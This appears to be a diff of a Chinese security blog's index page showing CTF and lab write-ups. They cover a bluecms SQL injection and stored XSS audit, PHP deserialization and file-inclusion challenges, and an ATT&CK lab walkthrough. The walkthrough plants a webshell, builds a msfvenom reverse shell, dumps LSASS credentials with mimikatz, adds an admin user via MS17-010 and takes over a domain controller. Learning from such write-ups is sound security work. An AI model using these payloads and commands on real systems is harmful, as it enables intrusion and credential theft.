+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:27:&quot;flagflagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:72:&quot;hihi&quot;;s:8:&quot;function&quot;;s:5:&quot;hello&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:3:&quot;img&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行敏感字过滤后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:27:&quot;&quot;;s:8:&quot;function&quot;;s:72:&quot;hihi&quot;;s:8:&quot;function&quot;;s:5:&quot;hello&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:3:&quot;img&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>读取 d0g3_f1ag.php得到：</p>
+<p>flag in /d0g3_fllllllag</p>
+<p>先对d0g3_fllllllagbase64加密后发现和d0g3_f1ag.php的长度一样，只需要把上一个加密后的改成这个文件名的base64密文得到flag</p>
 
       
 
@@ -639,7 +643,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/10/20/hackergame2019部分题解/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/01/20/反序列化字符逃逸/">展开全文 >></a>
         </p>
       
 
@@ -669,30 +673,36 @@
 
 
   
-    <article id="post-第一道文件上传题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-代码审计之bluecms-v1-6" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/10/09/第一道文件上传题/">第一道文件上传题</a>
+      <a class="article-title" href="/2021/01/15/代码审计之bluecms-v1-6/">代码审计之bluecms_v1.6</a>
     </h1>
   
 
         
-        <a href="/2019/10/09/第一道文件上传题/" class="archive-article-date">
-  	<time datetime="2019-10-09T14:45:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-09</time>
+        <a href="/2021/01/15/代码审计之bluecms-v1-6/" class="archive-article-date">
+  	<time datetime="2021-01-15T09:15:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-15</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>前段时间简单了解了一下文件上传，学习了常见的绕过方法，Js绕过文件上传、MIME绕过文件上传、拓展名限制上传、大小写绕过文件上传、点，空格绕过文件上传……<br>本以为学习了这些，就能应对大多数文件上传题目，直到做了这第一道文件上传题，才明白原来学的都只是些皮毛，文件上传，博大精深啊</p>
-        
-          <a class="article-more-a" href="/2019/10/09/第一道文件上传题/#more">more >></a>
-        
+        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>bluecms v1.6 sp1<br>phpstudy php5.4.45+apache+mysql<br>win7 64位专业版</p>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><h3 id="ad-js-php-SQL注入漏洞"><a href="#ad-js-php-SQL注入漏洞" class="headerlink" title="ad_js.php SQL注入漏洞"></a>ad_js.php SQL注入漏洞</h3><p><img src="https://gitee.com/hmanl0u/picgo/raw/master/20210115172209.png" alt><br>这里get传的参数ad_id只进行了简单的去空格操作，下面进行的select查询，只是简单的把这个变量加到了sql语句后边，没有进行任何过滤；<br>下面是注入过程：</p>
+<pre><code>?ad_id=-1 union select 1,2,3,4,5,6,7    //发现回显位
+?ad_id=-1 union select 1,2,3,4,5,6,database()   //当前数据库
+?ad_id=-1 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database()  //查表
+?ad_id=-1 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x626c75655f75736572   //查列名，由于对&apos;进行了过滤，所以这里用十六进制绕过
+?ad_id=-1 union select 1,2,3,4,5,6,group_concat(concat_ws(0x7e,user_name,pwd)) from blue_user //查数据</code></pre><p>看代码的最后几行会发现，对引号，\r,\n,进行了过滤，在其前面加了转义字符,所以对单引号，对引号的数据进行十六进制编码，绕过；因为十六进制会被认为是字符串<br>此外，回显的内容要在页面源代码里查看<br><img src="https://gitee.com/hmanl0u/picgo/raw/master/20210115173822.png" alt></p>
+<p>ps：初学代码审计，这个漏洞是看别人的，我做了复现；因为是学习，不仅要知其然，还要知其所以然；开始思考，为什么会凭空多出一个这个ad_js.php？然后开始溯源，发现这个在/admin/ad.php中出现，<br><img src="https://gitee.com/hmanl0u/picgo/raw/master/20210115174347.png" alt><br>对代码进行观察以及在浏览器查看相应的功能，发现这是用来获取广告的js的。<br><img src="https://gitee.com/hmanl0u/picgo/raw/master/20210115174751.png" alt></p>
+<h3 id="个人资料修改处xss存储型漏洞"><a href="#个人资料修改处xss存储型漏洞" class="headerlink" title="个人资料修改处xss存储型漏洞"></a>个人资料修改处xss存储型漏洞</h3><p>根据浏览器页面显示，找到user.php的my_info方法；<br><img src="https://gitee.com/hmanl0u/picgo/raw/master/20210115175206.png" alt><br>个人信息都是post进来的，$birthday、$email、$msn、$qq、$mobile_phone、$office_phone、$home_phone都只是进行简单的去空格处理，<br>$sex 获取变量的整数值,<br>$address进行了实体化编码；<br>邮件、地址、电话之类的都可以进行xss，可以直接写入；<br><img src="https://gitee.com/hmanl0u/picgo/raw/master/20210115180313.png" alt></p>
+
       
 
       
@@ -704,7 +714,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/10/09/第一道文件上传题/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/01/15/代码审计之bluecms-v1-6/">展开全文 >></a>
         </p>
       
 
@@ -734,35 +744,73 @@
 
 
   
-    <article id="post-sql注入基础" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-ATT-CK-一" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/10/03/sql注入基础/">sql注入基础</a>
+      <a class="article-title" href="/2020/12/25/ATT-CK-一/">ATT CK(一)</a>
     </h1>
   
 
         
-        <a href="/2019/10/03/sql注入基础/" class="archive-article-date">
-  	<time datetime="2019-10-03T07:07:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-03</time>
+        <a href="/2020/12/25/ATT-CK-一/" class="archive-article-date">
+  	<time datetime="2020-12-25T12:53:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-25</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>##mysql简单基本用法</p>
-<p>以sqli-labs为例<br>查库：select schema_name from information_schemata<br>查表：select tables_name from information_schema.tables where table_schema=’security’<br>查列：select column_name from information_schema.columns where table_name=’users’<br>查字段：select username,password from security.users</p>
-<p>limit0,1;其中第一位是从第几个开始，比如0代表从第一个开始，而第二位的1代表的就是现实多少个数据。</p>
-<p>order by 列数 对这一列排序，列数不正确就报错，可以用来判断列数，<br>字符串连接符号 group_concat(Str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每一条数据</p>
-<p>concat(‘<del>‘,A,B) ,有分隔符的地连接字符串，<br>查字段时可用 id=-1’union select 1,2,group_concat(concat_ws(‘</del>‘,username,password)) from security.users –+<br>如此使用，可以把表单里的信息全部列出来，不用像以前一样一一列举</p>
-<p>注入时不推荐使用单引号，可用十六进制替代</p>
-<p>1.left()函数：left(database(),1)=’s’    left(a,b)函数从左侧截取a的前b位，正确返回1，错误则返回0；<br>2.regexp函数: select user() regexp ‘r’  user()的结果是root,regexp为匹配root的正则表达式<br>3.like函数: select user() like ‘ro%’ 匹配与regexp相似，多了一个%<br>4.substr(a,b,c) select substr()    substr(a,b,c)从位置b开始，截取a字符串c为长度<br>5.ascii()     将某个字符串转化为ascii值<br>6.chr(数字)或者是ord(‘字母’)   使用python中的两个函数可以判断当前的ascii值是多少</p>
-<p>例：对于security数据库<br>select left(databases(),1)=’s’,前1位是否是s<br>select database() regexp ‘s’  匹配第一个字符是否是s<br>select database() like ‘s%’  匹配第一个字符是否是s<br>select substr((select database()),1,1)=’s’ 匹配第一个字符是否是s<br>select substr((select database()),1,3)=’sec’ 匹配前三个字符是否是sec<br>select ascii(substr((select database()),1,1)) 直接回显115<br>select ascii(substr((select database()),1,1))&gt;110 如果大于110，就会返回1，否则返回0；</p>
-<p>load_file 读取本地文件 select_load(‘文件路径’);<br>into_outfile 写文件<br>select…..into_outfile ‘file_name’<br>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有 FILE 权限，才能使用此语法。file_name 不能是一个已经存在的文件。<br>select ‘mysql is very good’ into_outfile ‘test1.txt’;  文件写的路径为默认路径 PHPTutorial\MySQL\data<br>或者是select ‘crow 666’ into_outfile ‘文件位置’</p>
+        <h3 id="web网站访问"><a href="#web网站访问" class="headerlink" title="web网站访问"></a>web网站访问</h3><p>在win7主机上开启phpstudy</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>1.在kali上使用nmap探测win7外网ip地址<br>2.得知192.168.254.154主机开启了80、3306端口，即开启了web、mysql服务<br>访问web服务</p>
+<p>3.使用御剑进行目录扫描，得到phpmyadmin数据库登录界面，与beifen.rar,解压后猜测为yxcms网站管理系统的备份文件尝试访问</p>
+<p>![屏幕截图 2020-12-16 162052](C:\Users\lenovo\Desktop\att&amp;ck\屏幕截图 2020-12-16 162052.jpg)</p>
+<h3 id="漏洞搜索与利用"><a href="#漏洞搜索与利用" class="headerlink" title="漏洞搜索与利用"></a>漏洞搜索与利用</h3><p>1.访问yxcms后，发现公告信息，有后台与默认密码</p>
+<p>2.成功登入后台，在管理首页-&gt;前台模板 处，发现能够添加和修改一些php文件；找到index_index.php,猜测这个可能是作为首页模板作为引用，在文件最后加上php一句话木马<br>然后用菜刀连接</p>
+<p><img src="//yoursite.com/2020/12/25/ATT-CK-一/C:%5CUsers%5Clenovo%5CDesktop%5Catt&ck%5C2.jpg" alt="2"></p>
+<p><img src="//yoursite.com/2020/12/25/ATT-CK-一/C:%5CUsers%5Clenovo%5CDesktop%5Catt&ck%5C3.jpg" alt="3"></p>
+<p><img src="//yoursite.com/2020/12/25/ATT-CK-一/C:%5CUsers%5Clenovo%5CDesktop%5Catt&ck%5C4.jpg" alt="4"></p>
+<p>也可以直接创建新的模板，写上一句话木马<br>根据之前下载的备份文件内容，查出文件路径，进行菜刀连接</p>
+<p><img src="//yoursite.com/2020/12/25/ATT-CK-一/C:%5CUsers%5Clenovo%5CDesktop%5Catt&ck%5C5.jpg" alt="5"></p>
+<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>1.msf反弹win7shell</p>
+<p>使用msf生成shell.php,用蚁剑上传，执行，kail监听，成功反弹shell到msf上。</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.21.136 LPORT=4444 -f exe &gt; shell.exe</code></pre><p><img src="//yoursite.com/2020/12/25/ATT-CK-一/C:%5CUsers%5Clenovo%5CDesktop%5Catt&ck%5C6.jpg" alt="6"></p>
+<p>输入shell，查看系统信息；有乱码，看着很不舒服；<br>使用 chcp 65001 这条语句即可解决msf拿到windows的shell显示乱码</p>
+<p>2.hash密码抓取</p>
+<p>这里是使用procdump配合mimikatz读明文密码<br>上传procdump</p>
+<p>上传mimikatz</p>
+<p>使用procdump导出lsass.dmp</p>
+<p><img src="//yoursite.com/2020/12/25/ATT-CK-一/C:%5CUsers%5Clenovo%5CDesktop%5Catt&ck%5C11.jpg" alt="11"></p>
+<pre><code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p>然后使用mimikatz读取密码：</p>
+<p><img src="//yoursite.com/2020/12/25/ATT-CK-一/C:%5CUsers%5Clenovo%5CDesktop%5Catt&ck%5C12.jpg" alt="12"></p>
+<pre><code>mimikatz
+privilege::debug
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords</code></pre><h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><p>由上面获取的系统信息，得知内网网段：192.168.52.0/24<br>先添加一条路由进来 run autoroute 192.168.52.0/24</p>
+<p><img src="//yoursite.com/2020/12/25/ATT-CK-一/C:%5CUsers%5Clenovo%5CDesktop%5Catt&ck%5C13.jpg" alt="13"></p>
+<p>arp -a 查看内网存活主机</p>
+<p><img src="//yoursite.com/2020/12/25/ATT-CK-一/C:%5CUsers%5Clenovo%5CDesktop%5Catt&ck%5C1.png" alt="1"></p>
+<p>发现其他两台主机192.168.52.141、192.168.52.138</p>
+<p>使用端口扫描扫描模块 auxiliary/scanner/portscan/tcp<br>发现开启了445端口，所以利用auxiliary/scanner/smb/smb_version可以扫描系统版本，扫描结果是windows2003</p>
+<p><img src="//yoursite.com/2020/12/25/ATT-CK-一/C:%5CUsers%5Clenovo%5CDesktop%5Catt&ck%5C3.png" alt="3"></p>
+<p>百度搜索win2003漏洞，发现ms08-067</p>
+<p><img src="//yoursite.com/2020/12/25/ATT-CK-一/C:%5CUsers%5Clenovo%5CDesktop%5Catt&ck%5C4.png" alt="4"></p>
+<p>使用ms08-067打一下，发现打不了</p>
+<p>开始尝试ms17-010，直接拿不到shell，发现可以使用auxiliary/admin/smb/ms17_010_command来执行一些命令且是系统权限，于是执行新建用户添加管理员，打开3389，然后通过proxychains远程桌面连接</p>
+<pre><code>use auxiliary/admin/smb/ms17_010_command
+show options
+set rhosts 192.168.52.141
+set command net user test @!FuckSEC!@ /add #添加用户
+run #成功执行
+set command net localgroup administrators test /add #管理员权限
+run #成功执行
+set command &apos;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&apos;
+run #成功执行</code></pre><p><img src="//yoursite.com/2020/12/25/ATT-CK-一/C:%5CUsers%5Clenovo%5CDesktop%5Catt&ck%5C14.jpg" alt="14"></p>
+<p>成功拿下第二个主机</p>
+<h3 id="拿下域控"><a href="#拿下域控" class="headerlink" title="拿下域控"></a>拿下域控</h3><p>定位到域控制器的ip为192.168.52.138<br>先试试smb扫描系统版本<br>能成功 win2008<img src="//yoursite.com/2020/12/25/ATT-CK-一/C:%5CUsers%5Clenovo%5CDesktop%5Catt&ck%5C5.png" alt="5"><br>因为之前抓到了域管理的账号密码所以直接使用exploit/windows/smb/psexec模块拿下域控，且是管理员权限</p>
 
       
 
@@ -775,7 +823,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/10/03/sql注入基础/">展开全文 >></a>
+          <a class="article-more-a" href="/2020/12/25/ATT-CK-一/">展开全文 >></a>
         </p>
       
 
@@ -805,30 +853,113 @@
 
 
   
-    <article id="post-htaccess文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-buuctf之1points" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/09/28/htaccess文件/">.htaccess文件</a>
+      <a class="article-title" href="/2020/11/12/buuctf之1points/">buuctf之1points</a>
     </h1>
   
 
         
-        <a href="/2019/09/28/htaccess文件/" class="archive-article-date">
-  	<time datetime="2019-09-28T07:42:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-28</time>
+        <a href="/2020/11/12/buuctf之1points/" class="archive-article-date">
+  	<time datetime="2020-11-12T12:17:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-12</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>.htaccess文件（或“分布式配置文件”）提供了一种基于每个目录进行配置更改的方法。包含一个或多个配置指令的文件放置在特定的文档目录中，这些指令适用于该目录及其所有子目录。</p>
-        
-          <a class="article-more-a" href="/2019/09/28/htaccess文件/#more">more >></a>
-        
+        <h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>mb_substr()函数返回字符串的一部分，shustr()函数只能用于英文字符，如果要分割的中文文字则需要用这个函数<br>mb_strpos()查找字符串在另一个字符串中首次出现的位置</p>
+<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>首先ctrl+u打开源码，发现提示，source.php,进入后，得到源代码：</p>
+<pre><code>&lt;?php
+    highlight_file(__FILE__);
+    class emmm
+    {
+        public static function checkFile(&amp;$page)
+        {
+            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
+            if (! isset($page) || !is_string($page)) {
+                echo &quot;you can&apos;t see it&quot;;
+                return false;
+            }
+
+            if (in_array($page, $whitelist)) {
+                return true;
+            }
+
+            $_page = mb_substr(
+                $page,
+                0,
+                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+
+            $_page = urldecode($page);
+            $_page = mb_substr(
+                $_page,
+                0,
+                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+            echo &quot;you can&apos;t see it&quot;;
+            return false;
+        }
+    }
+
+    if (! empty($_REQUEST[&apos;file&apos;])
+        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])
+        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])
+    ) {
+        include $_REQUEST[&apos;file&apos;];
+        exit;
+    } else {
+        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
+    }  
+?&gt;</code></pre><p>首先看主代码，</p>
+<pre><code>if (! empty($_REQUEST[&apos;file&apos;])&amp;&amp; is_string($_REQUEST[&apos;file&apos;])&amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;]))</code></pre><p>传入一个变量file，file是一个字符串且函数emmm::checkfile返回真，即可进行文件包含。<br>接着进入emmm类里的checkFile函数，</p>
+<p>首先传一个参数，file=hint.php，得到提示：flag not here, and flag in ffffllllaaaagggg<br>确定了目标，需包含ffffllllaaaagggg这个文件</p>
+<p>一共有四个判断语句：<br>第一个，传入的参数必须是字符串，否则返回false<br>第二个，如果传入参数在whitelist数组里，则返回true<br>第三个，判断截取后的$page是否存在于whitelist数组里，存在则返回true<br>第四个，先对$page进行url解码，然后判断进行截取，判断截取后的$page是否存在于whitelist数组里，存在则返回true</p>
+<p>突破点在第四个if语句中，会进行两次url解码，php中的$_GET、$_POST、$_REQUEST这类函数在提取参数值时会进行一次url解码<br>其次我们的突破点就在于这段代码只会截取?之前的字符串拿去和whitelist比对，因此只要确保?前的值是source.php或hint.php即可返回true<br>所以可以构造Payload:</p>
+<pre><code>/index.php?file=source.php%253F/../../../../ffffllllaaaagggg</code></pre><p>原理是source.php?/被当作目录，之后上跳目录就好了（这个只适用于linux），我们不知道文件在哪，只能一级一级的试</p>
+<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>1.data://伪协议     data协议可以使你输入得字符串作为数据流</p>
+<p>2.反序列化</p>
+<h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>打开题目，显示源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>需要通过两个if判断；</p>
+<p>第一个：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&apos;r&apos;)===&quot;welcome to the zjctf&quot;))</span><br></pre></td></tr></table></figure>
+
+<p>需要我们传入一个文件且其内容为welcome to the  zjctf，可以使用data伪协议。data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数取读取。构造如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain,welcome to the zjctf</span><br></pre></td></tr></table></figure>
+
+<p>第二个：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;/flag/&quot;,$file))</span><br></pre></td></tr></table></figure>
+
+<p>file中不能含有flag。根据提示，包含useless.php；并且读取出来；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
+
+<p>读到的useless.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果触发<code>__tostring()</code>函数，令$file=flag.php,就可以读取flag.php中的内容，刚好有一个</p>
+<p>echo $password;令$password为一个Flag对象，可以触发Flag类的<code>__tostring</code>方法；</p>
+<p>直接反序列化：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123; </span><br><span class="line">    public $file=&apos;flag.php&apos;;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">$a=new Flag();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到：O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}  </p>
+<p>最终获取flag的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+
       
 
       
@@ -840,7 +971,106 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/09/28/htaccess文件/">展开全文 >></a>
+          <a class="article-more-a" href="/2020/11/12/buuctf之1points/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-极客大挑战（hardsql-finalsql）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/15/极客大挑战（hardsql-finalsql）/">极客大挑战（hardsql&amp;finalsql）</a>
+    </h1>
+  
+
+        
+        <a href="/2020/10/15/极客大挑战（hardsql-finalsql）/" class="archive-article-date">
+  	<time datetime="2020-10-15T00:55:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>有关sql报错注入：extractvalue()、updatexml()</p>
+<p>extractvalue():对xml文档进行查询的函数<br>语法：extractvalue(目标文档，xml路径)<br>第二个参数，xml中的位置是可操作的地方，xml文档中查找字符串位置是用/xxx/xxx/xxx…这种格式，如果我们写入其他格式，就会报错，并且返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。<br>正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错<br>updatexml():对xml进行更新的函数。<br>语法：updatexml(目标xml文档，xml路径，更新的内容)<br>可用的地方和extractvalue()函数一致</p>
+<p>right、left函数<br>从字符串左边、右边取指定个字符，right(string,n)</p>
+<h2 id="极客大挑战-Hardsql"><a href="#极客大挑战-Hardsql" class="headerlink" title="[极客大挑战]Hardsql"></a>[极客大挑战]Hardsql</h2><p>经测试过滤了and、= 空格 union等多个sql关键字<br>常规sql注入被检测到。<br>然后发现order by 和 union 都不行<br>XPATH报错注入就可以用了<br>可以使用extractvalue和updatexml进行报错注入<br>输入的时候发现了<br>这题目还过滤了空格和and emmmm 用括号来代替空格就能绕过了<br>发现还不行<br>百度了web 的骚操作<br>用’^’来连接函数，形成异或<br>这边用的是extractvalue（）<br>爆数据库名</p>
+<pre><code>playload:username=44&amp;password=1&apos;^extractvalue(1,concat(0x7e,(select(database()))))%23</code></pre><p>爆表名</p>
+<pre><code>username=44&amp;password=1&apos;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&apos;geek&apos;)))))%23</code></pre><p>查字段</p>
+<pre><code>username=44&amp;password=1&apos;^extractvalue(1,concat(0x7e,(select(group_concat(passwor))from(information_schema.columns)where((table_name)like(&apos;H4rDsq1&apos;)))))%23</code></pre><p>查数据</p>
+<pre><code>username=44&amp;password=1&apos;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(H4rDsq1))))%23</code></pre><h2 id="极客大挑战-finalsql"><a href="#极客大挑战-finalsql" class="headerlink" title="[极客大挑战]finalsql"></a>[极客大挑战]finalsql</h2><p>根据提示，是盲注<br>过滤的字符和上题基本一样，用脚本跑，二分法<br>代码：</p>
+<pre><code>import time
+import requests
+
+url = &quot;http://779204c6-5eca-4e96-ab0c-f225aa0ed576.node3.buuoj.cn/search.php?id=&quot;
+
+i = 0
+result = &apos;&apos;
+while True:
+    i=i+1
+    low = 32
+    high = 127
+    while low &lt; high :
